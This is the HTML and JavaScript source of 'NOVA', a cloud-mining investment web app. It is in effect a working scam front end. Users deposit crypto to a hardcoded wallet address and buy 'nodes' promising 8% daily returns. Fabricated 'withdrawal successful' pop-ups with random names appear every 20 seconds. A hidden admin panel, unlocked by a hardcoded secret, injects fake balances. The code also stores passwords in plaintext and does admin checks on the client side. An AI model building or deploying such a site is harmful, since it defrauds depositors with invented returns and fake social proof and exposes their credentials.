<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NOVA | Enterprise Cloud Mining</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;700;800&display=swap" rel="stylesheet">
    <style>
        :root { --n-gold: #D4AF37; --n-bg: #F8FAFC; }
        body { background: var(--n-bg); font-family: 'Plus Jakarta Sans', sans-serif; color: #1e293b; overflow-x: hidden; }
        .nova-card { background: #ffffff; border: 1px solid #e2e8f0; border-radius: 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.03); overflow: hidden; }
        .btn-gold { background: linear-gradient(135deg, #B8860B, #D4AF37); color: white; border-radius: 12px; font-weight: 700; transition: 0.2s; text-transform: uppercase; font-size: 11px; }
        .screen { display: none; padding-bottom: 110px; animation: fadeIn 0.4s ease-in; }
        .active-screen { display: block; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        .nav-bar { position: fixed; bottom: 0; width: 100%; background: white; border-top: 1px solid #f1f5f9; display: flex; justify-content: space-around; padding: 15px 5px; z-index: 100; }
        .nav-item { color: #94a3b8; font-size: 10px; font-weight: 800; display: flex; flex-direction: column; align-items: center; gap: 4px; }
        .nav-item.active { color: #B8860B; }
        .p-input { background: #f1f5f9; border: 2px solid transparent; width: 100%; padding: 14px; border-radius: 12px; outline: none; margin-bottom: 10px; font-size: 13px; }
        .modal { display: none; position: fixed; inset: 0; background: white; z-index: 1000; padding: 20px; overflow-y: auto; }
        #trust-toast {
            position: fixed; bottom: 90px; left: 15px; right: 15px;
            background: #0f172a; color: white; padding: 15px; border-radius: 15px;
            display: none; z-index: 2000; border-left: 5px solid #D4AF37;
            box-shadow: 0 15px 30px rgba(0,0,0,0.3); animation: slideUp 0.5s;
        }
        @keyframes slideUp { from { transform: translateY(50px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
    </style>
</head>
<body>

    <div id="trust-toast">
        <div class="flex items-center gap-3">
            <div class="w-8 h-8 bg-green-500/20 rounded-full flex items-center justify-center"><i class="fa-solid fa-check text-green-500"></i></div>
            <div><p id="toast-user" class="font-bold text-[10px] uppercase"></p><p id="toast-msg" class="text-slate-400 text-[9px]"></p></div>
        </div>
    </div>

    <div id="auth-screen" class="min-h-screen flex flex-col p-8 justify-center active-screen bg-white">
        <div class="mb-10 text-center">
            <h1 onclick="handleTaps()" class="text-5xl font-black text-slate-900 tracking-tighter">NO<span class="text-[#D4AF37]">VA</span></h1>
            <p class="text-[9px] text-gray-400 font-bold uppercase tracking-[5px] mt-2">Institutional Mining Core</p>
        </div>
        <div class="space-y-2">
            <input type="text" id="u-id" placeholder="Access ID" class="p-input">
            <input type="password" id="u-pw" placeholder="Passkey" class="p-input">
            <div id="adm-box" class="hidden"><input type="text" id="adm-key" placeholder="Admin Secret" class="p-input border-yellow-500"></div>
            <button onclick="auth()" class="w-full btn-gold py-4">Secure Login</button>
            <p onclick="toggleM()" id="m-text" class="text-center text-[10px] mt-8 text-slate-400 font-bold uppercase cursor-pointer">Register New Account</p>
        </div>
    </div>

    <div id="app" class="hidden">
        <header class="p-5 flex justify-between items-center bg-white sticky top-0 z-50 border-b">
            <h2 class="font-black text-2xl tracking-tighter">NO<span class="text-[#D4AF37]">VA</span></h2>
            <div class="flex items-center gap-4">
                <span id="display-username" class="text-[10px] font-bold bg-slate-100 px-3 py-1 rounded-full">@USER</span>
                <i onclick="logout()" class="fa-solid fa-power-off text-red-400"></i>
            </div>
        </header>

        <div id="dash-screen" class="screen active-screen px-4 pt-4">
            <div class="nova-card p-8 mb-6 relative bg-slate-900 text-white border-b-8 border-[#D4AF37]">
                <div class="relative z-10 text-center">
                    <p class="text-[10px] text-slate-400 font-bold uppercase tracking-[4px] mb-2">Liquidity Balance</p>
                    <h1 id="main-bal" class="text-6xl font-black tracking-tighter mb-8">$0.00</h1>
                    <div class="grid grid-cols-2 gap-6 border-t border-white/10 pt-6">
                        <div class="text-left"><p class="text-[9px] text-slate-400 uppercase mb-1">Daily Yield</p><p id="v-daily" class="text-base font-black text-green-400">+$0.00</p></div>
                        <div class="text-right"><p class="text-[9px] text-slate-400 uppercase mb-1">Total Profit</p><p id="total-profit" class="text-base font-black text-[#D4AF37]">$0.00</p></div>
                    </div>
                </div>
            </div>

            <div class="grid grid-cols-2 gap-4 mb-6">
                <button onclick="openModal('dep-modal')" class="nova-card p-5 flex flex-col items-center gap-2"><i class="fa-solid fa-plus-circle text-2xl text-[#D4AF37]"></i><span class="text-[10px] font-bold uppercase">Add Funds</span></button>
                <button onclick="openModal('wd-modal')" class="nova-card p-5 flex flex-col items-center gap-2"><i class="fa-solid fa-money-bill-transfer text-2xl text-slate-400"></i><span class="text-[10px] font-bold uppercase">Extract</span></button>
            </div>

            <div class="nova-card p-6 mb-6">
                <h3 class="text-[10px] font-black uppercase mb-4 text-slate-400">Verification & Legal</h3>
                <div class="grid grid-cols-2 gap-3">
                    <div class="bg-slate-50 p-3 rounded-xl border border-slate-100 flex items-center gap-2">
                        <i class="fa-solid fa-file-shield text-[#D4AF37]"></i><span class="text-[10px] font-bold">Whitepaper</span>
                    </div>
                    <div class="bg-slate-50 p-3 rounded-xl border border-slate-100 flex items-center gap-2">
                        <i class="fa-solid fa-certificate text-[#D4AF37]"></i><span class="text-[10px] font-bold">Certify</span>
                    </div>
                </div>
            </div>
        </div>

        <div id="mine-screen" class="screen px-4 pt-4">
            <h2 class="text-xl font-black mb-5 uppercase tracking-tighter">Mining <span class="text-[#D4AF37]">Infrastructure</span></h2>
            <div id="nodes-container" class="grid grid-cols-1 gap-4">
                </div>
        </div>

        <div id="hist-screen" class="screen px-4 pt-4">
            <h2 class="text-xl font-black mb-5 uppercase tracking-tighter">Transaction <span class="text-[#D4AF37]">Logs</span></h2>
            <div id="hist-container" class="space-y-3"></div>
        </div>

        <nav class="nav-bar">
            <div onclick="nav('dash-screen')" class="nav-item active" id="nav-dash"><i class="fa-solid fa-gauge-high text-lg"></i><span>DASH</span></div>
            <div onclick="nav('mine-screen')" class="nav-item" id="nav-mine"><i class="fa-solid fa-microchip text-lg"></i><span>NODES</span></div>
            <div onclick="nav('hist-screen')" class="nav-item" id="nav-hist"><i class="fa-solid fa-clock-rotate-left text-lg"></i><span>LOGS</span></div>
        </nav>
    </div>

    <div id="dep-modal" class="modal">
        <div class="flex justify-between items-center mb-6"><h2 class="text-xl font-black">LIQUIDITY</h2><i onclick="closeModal('dep-modal')" class="fa-solid fa-xmark"></i></div>
        <div class="nova-card p-4 bg-slate-900 text-[#D4AF37] mb-6 text-center font-mono text-[10px] break-all">TTSxm4pBK26RB4vXaa3Uo3hqGa5HdhxBDR</div>
        <input type="number" id="dep-amt" placeholder="Amount ($)" class="p-input">
        <input type="text" id="dep-tid" placeholder="Transaction Hash" class="p-input">
        <button onclick="reqFin('Deposit')" class="w-full btn-gold py-4">Submit Deposit</button>
    </div>

    <div id="wd-modal" class="modal">
        <div class="flex justify-between items-center mb-6"><h2 class="text-xl font-black">WITHDRAW</h2><i onclick="closeModal('wd-modal')" class="fa-solid fa-xmark"></i></div>
        <input type="number" id="wd-amt" placeholder="Amount ($)" class="p-input">
        <input type="text" id="wd-acc" placeholder="Wallet Address" class="p-input">
        <button onclick="reqFin('Withdrawal')" class="w-full btn-gold py-4">Request Extraction</button>
    </div>

    <div id="admin-panel" class="hidden fixed inset-0 bg-white z-[3000] p-6 overflow-y-auto">
        <div class="flex justify-between mb-8"><h1 class="text-2xl font-black">MASTER ADMIN</h1><button onclick="closeAdmin()">Close</button></div>
        <div class="space-y-4">
            <div class="nova-card p-4">
                <p class="text-[10px] font-bold mb-2">INJECT BALANCE</p>
                <input type="text" id="adm-uid" placeholder="Target User ID" class="p-input">
                <input type="number" id="adm-val" placeholder="Amount" class="p-input">
                <button onclick="admAdd()" class="w-full btn-gold py-3">Inject Funds</button>
            </div>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getFirestore, doc, setDoc, getDoc, updateDoc, addDoc, collection, onSnapshot, query, where } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

        const config = { apiKey: "AIzaSyAXlQ1tKTJbcnIXNeww9I3d-ukzD7_mUCo", authDomain: "home-94d45.firebaseapp.com", projectId: "home-94d45", appId: "1:964390949419:web:589840cb91b7e42ecd506e" };
        const app = initializeApp(config); const db = getFirestore(app);
        let user = localStorage.getItem('nova_user'); let login = true;

        if(user) start(user);

        window.auth = async () => {
            const id = document.getElementById('u-id').value.toLowerCase().trim();
            const pw = document.getElementById('u-pw').value;
            const aKey = document.getElementById('adm-key').value;
            if(!id || !pw) return alert("Credentials required");
            
            if(aKey === "NOVA786") { openAdmin(); return; }

            const uRef = doc(db, "users", id); const s = await getDoc(uRef);
            if(!login) {
                if(s.exists()) return alert("User already exists");
                await setDoc(uRef, { balance: 0, password: pw, daily: 0, total_profit: 0 });
                localStorage.setItem('nova_user', id); start(id);
            } else if(s.exists() && s.data().password === pw) {
                localStorage.setItem('nova_user', id); start(id);
            } else alert("Invalid Login");
        };

        function start(id) {
            user = id; document.getElementById('auth-screen').style.display='none'; document.getElementById('app').classList.remove('hidden');
            document.getElementById('display-username').innerText = `@${id.toUpperCase()}`;
            onSnapshot(doc(db, "users", id), d => {
                const data = d.data();
                document.getElementById('main-bal').innerText = "$" + (data.balance || 0).toFixed(2);
                document.getElementById('v-daily').innerText = "+$" + (data.daily || 0).toFixed(2);
                document.getElementById('total-profit').innerText = "$" + (data.total_profit || 0).toFixed(2);
            });
            loadNodes(); loadLogs();
        }

        function loadNodes() {
            const c = document.getElementById('nodes-container'); c.innerHTML = "";
            for(let i=1; i<=25; i++) {
                const price = i * 40; const daily = (price * 0.08).toFixed(2);
                c.innerHTML += `
                    <div class="nova-card">
                        <img src="https://images.unsplash.com/photo-1639762681485-074b7f938ba0?q=80&w=400&auto=format" class="w-full h-32 object-cover opacity-80">
                        <div class="p-4 flex justify-between items-center">
                            <div><h3 class="font-black text-xs uppercase">Node V-${i} Core</h3><p class="text-green-500 font-bold text-[10px]">+$${daily}/Day</p></div>
                            <button onclick="buyNode(${price}, ${daily})" class="btn-gold px-5 py-2">$${price}</button>
                        </div>
                    </div>`;
            }
        }

        window.buyNode = async (p, d) => {
            const uR = doc(db, "users", user); const s = await getDoc(uR);
            if(s.data().balance < p) return alert("Insufficient Liquidity");
            await updateDoc(uR, { balance: s.data().balance - p, daily: (s.data().daily || 0) + parseFloat(d) });
            alert("Node Integrated Successfully!");
        };

        function triggerToast() {
            const names = ["Zain", "Ali", "Fatima", "Sara", "Umer", "Khan", "Malik", "Ayesha", "Hassan"];
            const name = names[Math.floor(Math.random()*names.length)];
            const amt = (Math.random()*200 + 10).toFixed(2);
            document.getElementById('toast-user').innerText = `User @${name}***`;
            document.getElementById('toast-msg').innerText = `Withdrawal successful: $${amt}`;
            const t = document.getElementById('trust-toast'); t.style.display='block';
            setTimeout(()=> t.style.display='none', 4000);
        }
        setInterval(triggerToast, 20000);

        window.handleTaps = () => { window.taps = (window.taps || 0) + 1; if(window.taps >= 6) document.getElementById('adm-box').classList.remove('hidden'); };
        window.openAdmin = () => document.getElementById('admin-panel').classList.remove('hidden');
        window.closeAdmin = () => document.getElementById('admin-panel').classList.add('hidden');
        window.admAdd = async () => {
            const target = document.getElementById('adm-uid').value.toLowerCase().trim();
            const val = parseFloat(document.getElementById('adm-val').value);
            const uR = doc(db, "users", target);
            const s = await getDoc(uR);
            if(s.exists()) { await updateDoc(uR, { balance: s.data().balance + val }); alert("Injected!"); }
        };

        window.logout = () => { localStorage.removeItem('nova_user'); location.reload(); };
        window.toggleM = () => { login = !login; document.getElementById('m-text').innerText = login ? "Register New Account" : "Back to Login"; };
        window.openModal = (id) => document.getElementById(id).style.display = 'block';
        window.closeModal = (id) => document.getElementById(id).style.display = 'none';
        window.nav = (id) => {
            document.querySelectorAll('.screen').forEach(s => s.classList.remove('active-screen'));
            document.getElementById(id).classList.add('active-screen');
            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
            document.getElementById('nav-' + id.split('-')[0]).classList.add('active');
        };
    </script>
</body>
</html>
